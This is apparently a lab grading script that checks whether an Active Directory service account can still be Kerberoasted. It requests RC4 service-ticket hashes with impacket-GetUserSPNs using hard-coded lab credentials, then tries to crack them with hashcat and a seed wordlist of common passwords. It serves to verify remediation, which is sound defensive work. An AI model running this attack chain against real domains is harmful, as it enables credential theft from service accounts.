#!/usr/bin/env bash
# meta4/ad-vm/scenario-03/verify-poc.sh
# PASS (exit 0) iff svc_sql is not RC4-Kerberoastable with a seed wordlist.

set -uo pipefail

# Tool preflight. /usr/bin/impacket-GetUserSPNs did not exist on the attacker
# -- the provisioner symlinked pip names pip never creates, into a directory
# the scenarios never call -- so the "no RC4 TGS in dump" branch below fired on
# every run and this scenario reported PASS on a fully vulnerable box.
# A missing grader dependency is a harness error, never a pass.
for t in /usr/bin/impacket-GetUserSPNs; do
    if [ ! -x "$t" ]; then
        echo "[verify-poc-03] HARNESS ERROR: $t missing or not executable" >&2
        exit 2
    fi
done

cd "$(mktemp -d)" || { echo "[verify-poc-03] HARNESS ERROR: mktemp failed" >&2; exit 2; }

/usr/bin/impacket-GetUserSPNs \
    -request -dc-ip 10.20.30.5 \
    -outputfile ks.hashes \
    'corp.local/alice:Password1!' 2>&1 | tee ks.out || true

echo "--- GetUserSPNs output ---"
cat ks.out
echo "--- /GetUserSPNs ---"

if [ ! -s ks.hashes ]; then
    if grep -qiE 'cannot find spn|no user found|no entries found' ks.out; then
        echo "[verify-poc-03] no roastable account for svc_sql -- BLOCKED"
        exit 0
    fi
fi

# If only AES (\$krb5tgs\$18\$) hashes returned, the RC4 cracking path
# is closed.
if grep -qE '\$krb5tgs\$18' ks.hashes && ! grep -qE '\$krb5tgs\$23\$' ks.hashes; then
    echo "[verify-poc-03] only AES TGS returned -- RC4 path closed, BLOCKED"
    exit 0
fi

# No RC4 hash and no recognised denial. This is NOT evidence of remediation:
# an empty ks.hashes is exactly what a broken or unreachable probe produces.
# The AES-only case is a genuine fix and is caught by the branch above.
if ! grep -qE '\$krb5tgs\$23\$' ks.hashes; then
    echo "[verify-poc-03] no RC4 TGS and no recognised denial - INCONCLUSIVE, grading FAIL" >&2
    echo "[verify-poc-03] an empty TGS dump is not proof that Kerberoasting was blocked" >&2
    exit 1
fi

# Seed wordlist with the inject password + common rotations.
cat > wl <<'EOF'
Password1!
Autumn24
Summer24
Winter24
Spring24
Welcome1
Welcome24
Service123
Service24
EOF

if ! command -v hashcat >/dev/null 2>&1; then
    echo "[verify-poc-03] HARNESS ERROR: hashcat unavailable; cannot validate crack" >&2
    echo "[verify-poc-03] hashcat is in Kali's repo and belongs in the attacker image" >&2
    exit 2
fi

CRACK=$(timeout 45 hashcat -m 13100 -a 0 --quiet --potfile-path=/dev/null ks.hashes wl 2>&1 || true)
echo "--- hashcat output ---"
echo "$CRACK"

# hashcat being INSTALLED is not the same as hashcat being able to COMPUTE.
# Without an OpenCL runtime it exits after printing device-requirement advice
# and cracks nothing -- and "nothing cracked" then reads as "the password is
# strong", returning PASS on a vulnerable box whose hash was just dumped.
# Observed on the live lab before pocl-opencl-icd was added to the image.
# A tool that cannot run is a harness error, never a security verdict.
if echo "$CRACK" | grep -qiE 'No devices found/left|requires? this runtime|OpenCL.*not (found|available)|No OpenCL compatible'; then
    echo "[verify-poc-03] HARNESS ERROR: hashcat has no usable OpenCL device -- cannot crack" >&2
    echo "[verify-poc-03] install pocl-opencl-icd in the attacker image" >&2
    exit 2
fi

# A successful crack appears as a line ending with the cleartext after :,
# e.g. '$krb5tgs$23$...:Autumn24'.
if echo "$CRACK" | grep -qE '\$krb5tgs\$23\$.*:[A-Za-z0-9!]+$'; then
    PW=$(echo "$CRACK" | grep -oE ':[^:]+$' | tail -1 | tr -d ':')
    echo "[verify-poc-03] cracked svc_sql password '$PW' -- PoC SUCCEEDED" >&2
    exit 1
fi

# An RC4 TGS was obtained but the seed wordlist did not crack it.
#
# This grades as BLOCKED by design: scenario-03's stated remediation set
# includes strengthening the service account password, so surviving the
# wordlist is a legitimate fix alongside the AES-only path handled above.
#
# The weakness is acknowledged: the verdict depends on wordlist coverage
# rather than purely on configuration. If phase 4a tightens this scenario,
# the cleaner design is to grade on "is an RC4 TGS obtainable at all" and move
# password strength to a separate scenario -- see the notes in threat.md.
echo "[verify-poc-03] RC4 hash dumped but pwd survived the seed wordlist -- PoC BLOCKED"
exit 0
